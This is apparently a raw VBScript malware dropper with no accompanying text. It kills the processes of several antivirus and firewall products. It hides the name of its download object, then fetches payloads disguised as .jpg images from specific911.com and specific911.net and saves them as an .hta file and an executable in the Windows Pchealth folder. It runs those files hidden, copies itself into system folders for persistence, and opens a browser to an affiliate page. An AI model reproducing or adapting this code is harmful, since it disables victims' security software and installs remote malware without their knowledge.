strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _ 
    ("SELECT * FROM Win32_Process WHERE Name = 'gcasServ.exe'")
For Each objProcess in colProcessList
    objProcess.Terminate()
Next
strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _ 
    ("SELECT * FROM Win32_Process WHERE Name = 'gcasServAlert.exe'")
For Each objProcess in colProcessList
    objProcess.Terminate()
Next
strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _ 
    ("SELECT * FROM Win32_Process WHERE Name = 'gcasDtServ.exe'")
For Each objProcess in colProcessList
    objProcess.Terminate()
Next
strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _ 
    ("SELECT * FROM Win32_Process WHERE Name = 'avpcc.exe'")
For Each objProcess in colProcessList
    objProcess.Terminate()
Next
strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _ 
    ("SELECT * FROM Win32_Process WHERE Name = 'avpm.exe'")
For Each objProcess in colProcessList
    objProcess.Terminate()
Next
strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _ 
    ("SELECT * FROM Win32_Process WHERE Name = 'OUTPOST.EXE'")
For Each objProcess in colProcessList
    objProcess.Terminate()
Next
strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _ 
    ("SELECT * FROM Win32_Process WHERE Name = 'DRWEB32W.EXE'")
For Each objProcess in colProcessList
    objProcess.Terminate()
Next
strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _ 
    ("SELECT * FROM Win32_Process WHERE Name = 'DRWEB32.EXE'")
For Each objProcess in colProcessList
    objProcess.Terminate()
Next
Dim BD
Dim xml
fgfrf = "MLHTT"
blabla = "Microsoft.X"
Set xml = CreateObject(blabla+fgfrf+"P")
xml.Open "GET", "http://specific911.com/acc1/1/ins.jpg", False
xml.Send
BD = xml.ResponseBody
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
Dim BinaryStream
Set BinaryStream = CreateObject("ADODB.Stream")
BinaryStream.Type = adTypeBinary
C=C=C
BinaryStream.Open
BinaryStream.Write BD
BinaryStream.SaveToFile "C:\WINDOWS\Pchealth\system.hta", adSaveCreateOverWrite
Dim WshShell
Set WshShell = CreateObject("WScript.Shell")
WScript.Sleep(120000)
WshShell.Run "C:\WINDOWS\Pchealth\system.hta", 0, false
Set FSA = CreateObject("Scripting.FileSystemObject")
Set file1 = FSA.GetFile(WScript.ScriptFullName)
file1.Copy("C:\WINDOWS\..vbs")
file1.Copy("C:\WINDOWS\Pchealth\1.vbs")
Set WshShell = CreateObject("WScript.Shell")
WScript.Sleep(120000)
WshShell.Run "C:\WINDOWS\Pchealth\1.vbs", 0, false
fgfrf = "MLHTT"
blabla = "Microsoft.X"
Set xml = CreateObject(blabla+fgfrf+"P")
xml.Open "GET", "http://specific911.net/aff/msits.jpg", False
xml.Send
Set BinaryStream = CreateObject("ADODB.Stream")
BinaryStream.Type = adTypeBinary
C=C=C
BinaryStream.Open
BinaryStream.Write BD
BinaryStream.SaveToFile "C:\WINDOWS\Pchealth\PopularScreenSavers.exe", adSaveCreateOverWrite
Set WshShell = CreateObject("WScript.Shell")
Set win = CreateObject("InternetExplorer.Application")
win.Visible=1
win.Silent=1
win.ToolBar=0
win.Navigate "http://specific911.net/aff/108/in.shtml"
WshShell.Run "C:\WINDOWS\Pchealth\PopularScreenSavers.exe", 0, false
